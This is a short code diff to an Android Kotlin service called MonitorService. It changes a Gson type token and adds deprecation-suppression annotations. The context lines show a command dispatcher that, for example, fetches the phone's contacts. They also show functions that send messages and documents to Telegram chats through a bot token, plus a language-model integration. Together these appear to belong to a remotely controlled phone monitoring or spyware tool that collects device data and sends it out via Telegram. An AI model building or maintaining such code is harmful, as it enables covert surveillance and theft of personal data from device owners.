@@ -336,7 +336,7 @@ class MonitorService : Service() {
 
     @Suppress("DEPRECATION")
     private fun executeCapability(capability: String, argsJson: String): Any {
-        val type = object : TypeToken<Map<String, Any>>() {}.type
+        val type = TypeToken.getParameterized(HashMap::class.java, String::class.java, Any::class.java).type
         val args = gson.fromJson(argsJson, type)
         return when (capability) {
             "contacts" -> getContacts()
@@ -721,6 +721,7 @@ class MonitorService : Service() {
         Thread({ sendTelegramInternal(chatId, text) }, "tg-$chatId").start()
     }
 
+    @Suppress("DEPRECATION")
     private fun sendTelegramInternal(chatId: Long, text: String) {
         try {
             val url = "$TELEGRAM_API$BOT_TOKEN/sendMessage"
@@ -737,6 +738,7 @@ class MonitorService : Service() {
         } catch (e: Exception) { Log.e("Telegram", "Send error", e) }
     }
 
+    @Suppress("DEPRECATION")
     private fun sendTelegramDocument(chatId: Long, filename: String, content: String, caption: String = "") {
         Thread({
             try {
@@ -786,6 +788,7 @@ class MonitorService : Service() {
 
     // ===== NVIDIA NEMOTRON 3 ULTRA 550B AI INTEGRATION =====
 
+    @Suppress("DEPRECATION")
     private fun callNemotron(prompt: String): String {
         try {
             val lower = prompt.lowercase()
